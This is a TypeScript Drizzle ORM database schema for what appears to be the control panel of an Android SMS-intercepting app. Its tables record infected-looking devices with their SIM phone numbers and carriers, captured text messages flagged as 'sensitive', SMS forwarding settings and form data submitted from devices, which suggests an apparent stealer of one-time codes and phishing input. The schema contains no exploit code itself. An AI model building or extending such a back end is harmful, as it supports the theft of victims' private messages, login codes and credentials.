import { pgTable, serial, text, integer, boolean, timestamp, jsonb, uniqueIndex, index } from "drizzle-orm/pg-core";

export const apps = pgTable("apps", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  name: text("name").notNull(),
  pin: text("pin").notNull().default("1234"),
  status: text("status").notNull().default("active"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  deleteProtectionPin: text("delete_protection_pin"),
  deleteProtectionEnabled: boolean("delete_protection_enabled").notNull().default(false),
  panelToken: text("panel_token"),
}, (t) => ({
  appIdUq: uniqueIndex("apps_app_id_uq").on(t.appId),
}));

export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  deviceId: text("device_id").notNull(),
  appId: text("app_id").notNull(),
  userId: text("user_id").notNull(),
  name: text("name").notNull(),
  androidVersion: integer("android_version").notNull().default(0),
  sim1Carrier: text("sim1_carrier"),
  sim1Phone: text("sim1_phone"),
  sim2Carrier: text("sim2_carrier"),
  sim2Phone: text("sim2_phone"),
  status: text("status").notNull().default("offline"),
  lastOnline: timestamp("last_online", { withTimezone: true }),
  forwardEnabled: boolean("forward_enabled").notNull().default(false),
  forwardSlot: integer("forward_slot"),
  fcmToken: text("fcm_token"),
  installedAt: timestamp("installed_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  deviceIdUq: uniqueIndex("devices_device_id_uq").on(t.deviceId),
  appIdx: index("devices_app_idx").on(t.appId),
  userIdx: index("devices_user_idx").on(t.userId),
}));

export const messages = pgTable("messages", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  userId: text("user_id").notNull(),
  fromSender: text("from_sender").notNull(),
  fromNumber: text("from_number").notNull(),
  body: text("body").notNull(),
  isSensitive: boolean("is_sensitive").notNull().default(false),
  receivedAt: timestamp("received_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appReceivedIdx: index("messages_app_received_idx").on(t.appId, t.receivedAt),
  deviceReceivedIdx: index("messages_device_received_idx").on(t.deviceId, t.receivedAt),
  userIdx: index("messages_user_idx").on(t.userId),
}));

export const formData = pgTable("form_data", {
  id: serial("id").primaryKey(),
  appId: text("app_id").notNull(),
  deviceId: text("device_id").notNull(),
  data: jsonb("data").notNull(),
  submittedAt: timestamp("submitted_at", { withTimezone: true }).notNull().defaultNow(),
}, (t) => ({
  appSubmittedIdx: index("form_data_app_submitted_idx").on(t.appId, t.submittedAt),
  deviceIdx: index("form_data_device_idx").on(t.deviceId),
}));
